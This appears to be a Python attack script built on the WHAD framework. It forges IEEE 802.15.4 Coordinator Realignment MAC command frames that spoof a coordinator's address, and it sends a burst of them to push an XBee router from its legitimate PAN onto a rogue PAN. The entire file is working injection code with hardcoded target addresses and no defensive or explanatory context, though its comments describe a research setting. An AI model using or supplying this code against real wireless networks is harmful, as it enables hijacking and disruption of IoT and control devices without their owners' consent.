from whad.device import WhadDevice
from whad.dot15d4.connector import Dot15d4
import struct
import time

# 1. Hardware Initialization
dev = WhadDevice.create("uart0")
connector = Dot15d4(dev)

# 2. Parameters from Research Environment
LEGIT_PAN = 0xc719
ROGUE_PAN = 0xdead
HUB_IEEE = bytes.fromhex("00124b0039de036e") # Coordinator IEEE
TARGET_ROUTER = 0x77fb # XBee Router NWK

def inject_realignment_attack(seq):
    # --- MAC Command 0x07 Payload ---
    # ID(0x07) + RoguePAN(LE) + CoordShort(0x0000) + Channel(11) + NodeShort(0x77FB)
    payload = b"\x07" + struct.pack("<H", ROGUE_PAN) + b"\x00\x00" + b"\x0b" + struct.pack("<H", TARGET_ROUTER)

    # --- MAC Header Construction ---
    # FCF: 0x23c8 (Command, AckReq, DestShort, SrcLong)
    mac_fcf = b"\x23\xc8" 
    mac_seq = struct.pack("B", seq)
    # Addressing: DestPAN + DestAddr + SrcPAN + SrcAddr(IEEE)
    addr_fields = struct.pack("<H", LEGIT_PAN) + struct.pack("<H", TARGET_ROUTER) + \
                  struct.pack("<H", LEGIT_PAN) + HUB_IEEE[::-1]
    
    full_packet = mac_fcf + mac_seq + addr_fields + payload
    
    print(f"[*] Injecting Realignment (Seq: {seq}) to shift {hex(TARGET_ROUTER)} to PAN {hex(ROGUE_PAN)}")
    connector.send(full_packet)

try:
    # Send a burst to ensure the XBee processes the topology shift
    for i in range(10):
        inject_realignment_attack(200 + i)
        time.sleep(0.1)
finally:
    dev.close()
    print("[!] Attack burst finished. Check XBee status.")